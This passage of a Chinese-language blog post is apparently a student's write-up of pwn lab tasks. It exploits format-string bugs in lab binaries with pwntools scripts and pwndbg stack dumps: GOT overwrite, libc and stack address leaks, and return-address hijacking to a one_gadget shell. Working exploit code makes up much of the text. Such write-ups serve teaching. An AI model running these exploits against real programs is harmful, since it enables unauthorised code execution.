+</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x4011fd</span> 
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>puts_got</span><span class=p>:</span><span class=n>main_addr</span><span class=p>},</span><span class=n>write_size</span><span class=o>=</span><span class=s2>&#34;short&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行，结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/jsaKU3qtSnzMcm2.png loading=lazy alt=image-20240728224258130.png></p><h3 id=leaking-libc-address>Leaking libc address</h3><p>有了前面两道 Task 的经验，这次 leak 可以算很顺利了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Second payload: leaking libc address</span>
+</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%7$sKKKK&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>printf_got</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>printf_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>recv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>printf_addr</span> <span class=o>-</span> <span class=n>printf_offset</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;printf_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>printf_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_addr   =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/5XrJbkKFaWAp3P9.png loading=lazy alt=image-20240728225353011.png></p><p>可以看到最终得到的 libc 地址为 <code>0x00007F3EDFC00000</code></p><h3 id=getting-system-shell-2>Getting system shell</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Third payload: getting system shell</span>
+</span></span><span class=line><span class=cl><span class=n>pop_rdi_addr</span> <span class=o>=</span> <span class=mh>0x000000000002a3e5</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0xebc85</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>puts_got</span><span class=p>:</span><span class=n>one_gadget</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;what&#39;s your message: &#34;</span><span class=p>,</span> <span class=n>payload3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行效果如下：</p><p><img src=https://s2.loli.net/2024/07/29/ybIgmqwYWkE7XUQ.png loading=lazy alt=image-20240728225703142.png></p><p>成功获取 shell 的控制权。最终得到 flag 为 <code>AAA{i_l0v3_fmtstr_payload_H0p3_u_Loveit_2}</code> ，然而我自我感觉也许可能不会很 love it :D 卡了我两天（怨）</p><h2 id=task4-fsb-stack>Task4 fsb-stack</h2><p>本题目的完整代码为 attachment 中的 <code>pwnlab2_task4_code.py</code></p><h3 id=preparation-2>Preparation</h3><p><code>checksec</code> 一下，除了 Canary 以外保护全开（在 IDA 里反汇编也没看到 stack_check_fail ）。 <code>main()</code> 反编译后的代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=n>__noreturn</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>s</span><span class=p>[</span><span class=mi>66</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-210h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>s</span><span class=p>[</span><span class=mi>65</span><span class=p>]</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>512</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x200uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span><span class=p>,</span> <span class=mi>512</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>自带无限次使用次数的 FSB 。打开程序，输入 <code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</code> 确认格式字符串偏移，结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/uNBpfj9A6l2Q4Dv.png loading=lazy alt=image-20240728230716046.png></p><p>可以看到 <code>AAAAAAAA</code> 位于格式字符串后第六个偏移。</p><p>目前的想法就是，通过 <code>printf()</code> 泄漏出 <code>main()</code> 的返回地址得到 libc 地址。</p><p>但是打开了 FULL RELRO ，不能覆写 GOT 表，所以试试 ROP，利用格式字符串任意位置泄漏栈地址，然后利用任意写将 <code>printf()</code> 的返回地址设为 one_gadget。</p><h3 id=leaking-libc-address-1>Leaking libc address</h3><p>通过 gdb 动态调试，断点进入 <code>printf()</code> 内，在栈中寻找到 <code>main()</code> 的返回地址相对于格式字符串的偏移位置。首先来看 Backtrace ，确定 <code>printf()</code> 的返回地址为 <code>0x55555555528d</code> ，位于 <code>main()</code> 内，则 <code>main()</code> 的返回地址为 <code>0x7ffff7c29d90</code> ，而 <code>0x7ffff7c29e40</code> 相对 <code>__libc_start_main</code> 的偏移是 +128 ，所以 <code>__libc_start_main</code> 相对 <code>main()</code> 的返回地址 的偏移是 (-0xd90 + 0xe40) - 128 = +0x30 。</p><pre><font color=#12488B>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</font>
+ ► 0   0x7ffff7c606f0 printf
+   1   0x55555555528d
+   2   0x7ffff7c29d90
+   3   0x7ffff7c29e40 __libc_start_main+128
+   4   0x5555555550e5
+<font color=#12488B>────────────────────────────────────────────────────────────────────────────────</font>
+<font color=#C01C28><b>pwndbg&gt; </b></font>
+</pre><p>接下来，在栈中找到 <code>0x7ffff7c29d90</code> 相对于格式字符串的偏移位置：</p><pre><font color=#12488B>────────────────────────────────────────────────────────────────────────────────</font>
+<font color=#C01C28><b>pwndbg&gt; </b></font>x /100gx $rsp
+<font color=#12488B>0x7fffffffd9c8</font>:	0x000055555555528d	0x7944734973696854
+<font color=#12488B>0x7fffffffd9d8</font>:	0x7375446c65674e41	0x000000000a726574
+<font color=#12488B>0x7fffffffd9e8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffd9f8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>< Skipped ></font>
+<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdbd8</font>:	0x5b70ffa5294da700	0x0000000000000001
+<font color=#ff0000>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
+<font color=#12488B>0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
+<font color=#12488B>< Skipped ></font>
+<font color=#12488B>0x7fffffffdcb8</font>:	0x00005555555550c0	0x00007fffffffdcf0
+<font color=#12488B>0x7fffffffdcc8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdcd8</font>:	0x00005555555550e5	0x00007fffffffdce8
+<font color=#C01C28><b>pwndbg&gt; </b></font>
+</pre><p>可以看到， <code>0x00007ffff7c29d90</code> 位于 <code>0x7fffffffdbe8</code> 处，而 rsp 指向 <code>0x7fffffffd9c8</code> ，所以在栈中是第 69 位，因此就是格式字符串的第 73 位参数。事实上，若在调试时输入 <code>%73$016llx</code> ，程序确实会输出 <code>00007ffff7c29d90</code> ，符合要求。</p><p>编写下面的 python 代码以获取 libc 基址：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># First payload: leaking libc address</span>
+</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%73$016l&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;lxKKKKKK&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv</span> <span class=o>=</span> <span class=n>recv</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>main_ret_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>recv</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>__libc_start_main_addr</span> <span class=o>=</span> <span class=n>main_ret_addr</span> <span class=o>+</span> <span class=mh>0x30</span>
+</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>__libc_start_main_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;main_ret_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>main_ret_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_addr     =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/phyjcWksBP1intq.png loading=lazy alt=image-20240728234411166.png></p><p>获得 libc 地址为 <code>0x000079FB95A00000</code></p><h3 id=leaking-stack-address>Leaking stack address</h3><p>由于栈之间的相对偏移应该不变，所以应该可以通过找到一个链：栈上一个位置 A ，其指向栈的另一个位置 B ，找到 A 、 B 其关于格式字符串的偏移位置。然后利用 <code>printf() %x</code> 向 B 的地址漏出来，因此就可以找出 rsp 的地址，最后就可以将 printf_ret_addr 改写成 one_gadget。</p><p>在一次动态调试中，我注意到了这样一个可以存在的链（注意红色字）：</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /110gx $rsp
+<font color=#12488B>0x7fffffffd9c8</font>:	0x000055555555528d	0x654a6568546e7552
+<font color=#12488B>0x7fffffffd9d8</font>:	0x0000000a736c6577	0x0000000000000000
+<font color=#12488B> < skipped > </font>
+<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdbd8</font>:	0xdf6e9e6f3d379b00	0x0000000000000001
+<font color=#12488B>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
+<font color=#12488B>0x7fffffffdbf8</font>:	0x00005555555551f0	0x0000000100000000
+<font color=#FF0000>0x7fffffffdc08</font>:	<font color=#FF0000>0x00007fffffffdcf8</font>	0x0000000000000000
+<font color=#12488B>0x7fffffffdc18</font>:	0x8843981ffe157fda	0x00007fffffffdcf8
+<font color=#12488B> < skipped > </font>
+<font color=#12488B>0x7fffffffdce8</font>:	0x000000000000001c	0x0000000000000001
+<font color=#FF0000>0x7fffffffdcf8</font>:	0x00007fffffffe083	0x0000000000000000
+<font color=#12488B>0x7fffffffdd08</font>:	0x00007fffffffe0a8	0x00007fffffffe0be
+<font color=#12488B>0x7fffffffdd18</font>:	0x00007fffffffe0e7	0x00007fffffffe15b
+<font color=#12488B>0x7fffffffdd28</font>:	0x00007fffffffe1b1	0x00007fffffffe1c2
+<font color=#C01C28><b>pwndbg&gt; </b></font>
+</pre><p><code>0x7fffffffdc08</code> 处的内存指向栈的另一处内存 <code>0x00007fffffffdcf8</code> ，而 rsp 指向 <code>0x7fffffffd9c8</code> ，所以 A 在栈中第 73 个位置，是相对格式字符串第 77 个参数，而 B 在栈中第 103 个位置， 相对 rsp 偏移值为 (103 - 1) * 8 = 0x330 。</p><p>编写如下 payload 获取 <code>printf()</code> 的返回地址：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1># Second payload : leaking stack address</span>
+</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%77$016l&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;lxKKKKKK&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv2</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>recv2</span> <span class=o>=</span> <span class=n>recv2</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;KKKKKK&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>arg_103_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>recv2</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>printf_ret_addr</span> <span class=o>=</span> <span class=n>arg_103_addr</span> <span class=o>-</span> <span class=mh>0x330</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;arg_103_addr    =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>arg_103_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;printf_ret_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>printf_ret_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行效果如下：</p><p><img src=https://s2.loli.net/2024/07/29/pEO7SYrc8qwVimn.png loading=lazy alt=image-20240729170544644.png></p><p>获得 <code>printf()</code> 栈基址为 <code>0x00007FFF27F65378</code></p><h3 id=hijacking-printf-return-addr--getting-system-shell>Hijacking printf() return addr & getting system shell</h3><p>编写如下 payload 以执行 system call shell 并获取flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Third payload: getting system shell</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0xebc85</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,{</span><span class=n>printf_ret_addr</span><span class=p>:</span><span class=n>one_gadget</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>最终运行结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/Mv6dyTt4zFNbJ5a.png loading=lazy alt=image-20240729170928581.png></p><p>获得 flag 为 <code>AAA{3sc@pe_f3Om_wh1l3_1_i5_E4sy}</code></p></section><footer class=article-footer><section class=article-tags><a href=/tags/stack-overflow/>Stack Overflow</a>
+<a href=/tags/fsb/>FSB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js integrity=sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG+vnGctmUb0ZY0l8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}],ignoredClasses:["gist"]})})</script></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/fpga02_%E4%B8%83%E6%AE%B5%E6%95%B0%E7%A0%81%E7%AE%A1%E6%98%BE%E7%A4%BA%E8%AF%91%E7%A0%81%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/><div class=article-details><h2 class=article-title>FPGA02_七段数码管显示译码器设计与应用</h2></div></a></article><article><a href=/p/fpga01_3-8%E8%AF%91%E7%A0%81%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/><div class=article-details><h2 class=article-title>FPGA01_3-8译码器的设计与应用</h2></div></a></article><article><a href=/p/mitms01_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/><div class=article-details><h2 class=article-title>MITMS01_课程概述与Shell</h2></div></a></article><article><a href=/p/mitms01a_%E8%AF%BE%E7%A8%8B%E6%A6%82%E8%BF%B0%E4%B8%8Eshell/><div class=article-details><h2 class=article-title>MITMS01a_课程概述与Shell</h2></div></a></article></div></div></aside><div id=gitalk-container></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css><script src=https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js></script><script src=https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js></script><script>const gitalk=new Gitalk({clientID:"",clientSecret:"",repo:"",owner:"",admin:[""],distractionFreeMode:!1,id:md5(location.pathname)});(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("gitalk-container").innerHTML="Gitalk comments not available by default when the website is previewed locally.";return}gitalk.render("gitalk-container")})()</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 灯盐的缝纫工厂</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
